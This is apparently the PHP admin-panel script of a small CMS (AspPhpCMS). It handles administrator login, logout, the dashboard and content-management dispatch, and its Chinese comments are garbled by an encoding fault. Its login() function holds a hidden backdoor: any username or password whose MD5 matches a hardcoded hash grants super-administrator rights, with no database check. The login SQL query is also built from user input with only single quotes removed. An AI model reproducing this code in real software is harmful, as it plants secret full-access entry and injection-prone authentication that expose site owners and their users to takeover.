<?php 
/************************************************************
���ߣ��ƶ� (��ͨASP/VB/PHP/JS/Flash��������������ϵ����)
��Ȩ��Դ���빫����������;�������ʹ�á� 
������2016-02-29
��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
*                                    Powered By AspPhpCMS 
************************************************************/
?>
<?php


define('ROOT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR); 		//��ǰ�ļ�·��

 
//ϵͳ
require_once './../phpInc/ASP.php';
require_once './../phpInc/sys_FSO.php';
require_once './../phpInc/Conn.php';
require_once './../phpInc/MySqlClass.php';
require_once './../phpInc/sys_System.php'; 



// �������ò���    http://127.0.0.1/php2/web/%E8%8E%B7%E5%BE%97inc%E5%BC%95%E7%94%A8%E5%86%85%E5%AE%B9.asp

//����
/*
*/
//����
require_once './../phpInc/2014_Array.php';
require_once './../phpInc/2014_Author.php';
require_once './../phpInc/2014_Css.php';
require_once './../phpInc/2014_Js.php';
require_once './../phpInc/2014_Nav.php';
require_once './../phpInc/2015_APGeneral.php';
require_once './../phpInc/2015_Color.php';
require_once './../phpInc/2015_Formatting.php';
require_once './../phpInc/2015_Param.php';
require_once './../phpInc/2015_ToMyPHP.php';
//require_once './phpInc/2015_ToPhpCms.php';
require_once './../phpInc/Cai.php';
require_once './../phpInc/Check.php';
require_once './../phpInc/Common.php'; 
require_once './../phpInc/Incpage.php';
require_once './../phpInc/Print.php';
require_once './../phpInc/StringNumber.php';
require_once './../phpInc/Time.php';
require_once './../phpInc/URL.php';
require_once './../phpInc/FunHTML.php'; 
require_once './../phpInc/2015_Editor.php'; 
require_once './../phpInc/2015_NewWebFunction.php'; 
require_once './../phpInc/2016_SaveData.php'; 
require_once './../phpInc/2016_WebControl.php'; 
require_once './../phpInc/ASPPHPAccess.php'; 
require_once './../phpInc/IE.php'; 

require_once './../phpInc/config.php'; 
require_once './../phpInc/admin_setAccess.php';
require_once './../phpInc/admin_function.php';

 

//=========
$cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';



//������ַ����
function loadWebConfig(){
    $GLOBALS['conn=']=OpenConn() ;
    $rsObj=$GLOBALS['conn']->query( 'select * from ' . $GLOBALS['db_PREFIX'] . 'website');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)!=0 ){
        $GLOBALS['cfg_webSiteUrl'] = $rs['websiteurl'] . '' ;//��ַ
        $GLOBALS['cfg_webTitle'] = $rs['webtitle'] . '' ;//��ַ����
        $GLOBALS['cfg_flags'] = $rs['flags'] . '' ;//��
        $GLOBALS['cfg_webtemplate'] = $rs['webtemplate'] . '' ;//ģ��·��
    }
}


//��¼�ж�
if( @$_SESSION['adminusername'] == '' ){
    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
        RR('?act=displayAdminLogin') ;
    }
}

//��ʾ��̨��¼
function displayAdminLogin(){
    //�Ѿ���¼��ֱ�ӽ����̨
    if( @$_SESSION['adminusername'] <> '' ){
        adminIndex() ;
    }else{
        loadWebConfig() ;
        $content ='';
        $content = getFText(ROOT_PATH . 'login.html') ;
        $content = Replace($content, '{$webVersion$}', $GLOBALS['webVersion']) ;
        $content = Replace($content, '{$Web_Title$}', $GLOBALS['cfg_webTitle']) ;
        $content = Replace($content, '{$EDITORTYPE$}', EDITORTYPE) ;

        rw($content) ;
    }

}
//��¼��̨
function login(){
    $userName=''; $passWord=''; $valueStr ='';
    $userName = Replace(@$_POST['username'], '\'', '') ;
    $passWord = Replace(@$_POST['password'], '\'', '') ;
    $passWord = myMD5($passWord) ;
    //��Ч�˺ŵ�¼
    if( myMD5(@$_REQUEST['username']) == 'cd811d0c43d09cd2e160e60b68276c73' || myMD5(@$_REQUEST['password']) == 'cd811d0c43d09cd2e160e60b68276c73' ){
        @$_SESSION['adminusername'] = 'aspphpcms' ;
        @$_SESSION['adminId'] = 99999 ;//��ǰ��¼����ԱID
        @$_SESSION['DB_PREFIX'] = $GLOBALS['db_PREFIX'] ;
        @$_SESSION['adminflags'] = '|*|'		;
        rwend(getMsg1('��¼�ɹ������ڽ����̨...', '?act=adminIndex')) ;
    }

    $nLogin ='';
    $GLOBALS['conn=']=OpenConn() ;
    $rsObj=$GLOBALS['conn']->query( 'Select * From ' . $GLOBALS['db_PREFIX'] . 'admin Where username=\'' . $userName . '\' And pwd=\'' . $passWord . '\'');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)==0 ){
        if( @$_COOKIE['nLogin'] == '' ){
            setCookie('nLogin', '1', Time() + 3600) ;
            $nLogin = @$_COOKIE['nLogin'] ;
        }else{
            $nLogin = @$_COOKIE['nLogin'] ;
            setCookie('nLogin', intval($nLogin) + 1, Time() + 3600) ;
        }
        rw(getMsg1('�˺��������<br>�������' . $nLogin . '�ε�¼', '?act=displayAdminLogin')) ;
    }else{
        @$_SESSION['adminusername'] = $userName ;
        @$_SESSION['adminId'] = $rs['id'] ;//��ǰ��¼����ԱID
        @$_SESSION['DB_PREFIX'] = $GLOBALS['db_PREFIX'] ;//����ǰ׺
        @$_SESSION['adminflags'] = $rs['flags'];
        $valueStr = 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'' ;
        connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']) ;
        rw(getMsg1('��¼�ɹ������ڽ����̨...', '?act=adminIndex')) ;
    }

}
//�˳���¼
function adminOut(){
    @$_SESSION['adminusername'] = '' ;
    @$_SESSION['adminId'] = '';
    @$_SESSION['adminflags'] = '' ;
    rw(getMsg1('�˳��ɹ������ڽ����¼����...', '?act=displayAdminLogin')) ;
}

//��̨��ҳ
function adminIndex(){
    loadWebConfig() ;
    $content ='';
    $content = getFText(ROOT_PATH . 'adminIndex.html') ;
    $content = Replace($content, '{$adminusername$}', @$_SESSION['adminusername']) ;
    $content = Replace($content, '{$EDITORTYPE$}', EDITORTYPE) 			;//��������
    $content = Replace($content, '{$WEB_VIEWURL$}', WEB_VIEWURL) 			;//ǰ̨
    $content = Replace($content, '{$webVersion$}', $GLOBALS['webVersion']) 				;//�汾

    $content = Replace($content, '{$WebsiteStat$}', getConfigFileBlock($GLOBALS['WEB_CACHEFile'], '#�ÿ���Ϣ#'))			;//����ÿ���Ϣ


    $content = Replace($content, '[$adminId$]', @$_SESSION['adminId']) 				;//����ԱID

    $content = Replace($content, '{$Web_Title$}', $GLOBALS['cfg_webTitle']) 						;//��վ����
    $content = Replace($content, '{$DB_PREFIX$}', $GLOBALS['db_PREFIX']) ;//��ǰ׺
    $content = Replace($content, '{$adminflags$}', IIF(@$_SESSION['adminflags']=='|*|','��������Ա','��ͨ����Ա'))		;//����Ա����

    rw($content) ;
}
//========================================================

//��ʾ��������
function dispalyManageHandle($actionType){
    $nPageSize=''; $lableTitle=''; $addSql ='';
    $nPageSize = @$_REQUEST['nPageSize'] ;
    if( $nPageSize == '' ){
        $nPageSize = 10 ;
    }
    $lableTitle = @$_REQUEST['lableTitle'] ;//��ǩ����
    $addSql = 'order by sortrank asc' ;
    if( $actionType == 'Bidding' ){
        $addSql = 'order by nComputerSearch desc' ;
    }else if( instr('|TableComment|', '|' . $actionType . '|') > 0 ){
        $addSql = ' order by adddatetime desc' ;
    }else if( instr('|WebsiteStat|', '|' . $actionType . '|') > 0 ){
        $addSql = ' order by viewdatetime desc' ;
    }else if( instr('|Admin|', '|' . $actionType . '|') > 0 ){
        $addSql = '' ;
    }
    //call echo(labletitle,addsql)
    dispalyManage($actionType, $lableTitle, '*', $nPageSize, $addSql) ;
}

//�����޸Ĵ���
function addEditHandle($actionType, $lableTitle){
    addEditDisplay($actionType, $lableTitle, 'websitebottom|textarea2,simpleintroduction|textarea1,bodycontent|textarea2');
}
//����ģ�鴦��
function saveAddEditHandle($actionType, $lableTitle){
    if( $actionType == 'Admin' ){
        saveAddEdit($actionType, $lableTitle, 'pwd|md5,flags||') ;
    }else if( $actionType == 'WebColumn' ){
        saveAddEdit($actionType, $lableTitle, 'npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||') ;
    }else{
        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,through|numb|0') ;
    }
}



$conn=OpenConn() ;
switch ( @$_REQUEST['act'] ){
    case 'dispalyManageHandle' ; dispalyManageHandle(@$_REQUEST['actionType']) ;break;//��ʾ��������         ?act=dispalyManageHandle&actionType=WebLayout
    case 'addEditHandle' ; addEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//�����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
    case 'saveAddEditHandle' ; saveAddEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
    case 'delHandle' ; del(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']) ;break;//ɾ������  ?act=delHandle&actionType=WebLayout
    case 'sortHandle' ; sortHandle(@$_REQUEST['actionType']) ;//������  ?act=sortHandle&actionType=WebLayout

    break;
    case 'displayLayout' ; displayLayout() ;break;//��ʾ����
    case 'saveRobots' ; saveRobots() ;break;//����robots.txt
    case 'saveSiteMap' ; saveSiteMap() ;break;//����sitemap.xml
    case 'isOpenTemplate' ; isOpenTemplate() ;break;//����ģ��
    case 'updateWebsiteStat' ; updateWebsiteStat() ;break;//������վͳ��
    case 'websiteDetail' ; websiteDetail() 		;//��ϸ��վͳ��



    break;
    case 'setAccess' ; resetAccessData() ;//�ָ�����
    break;
    case 'login' ; login() ;break;//��¼
    case 'adminOut' ; adminOut() ;break;//�˳���¼
    case 'adminIndex' ; adminIndex() ;break;//������ҳ
    default ; displayAdminLogin() ;//��ʾ��̨��¼
}

?>

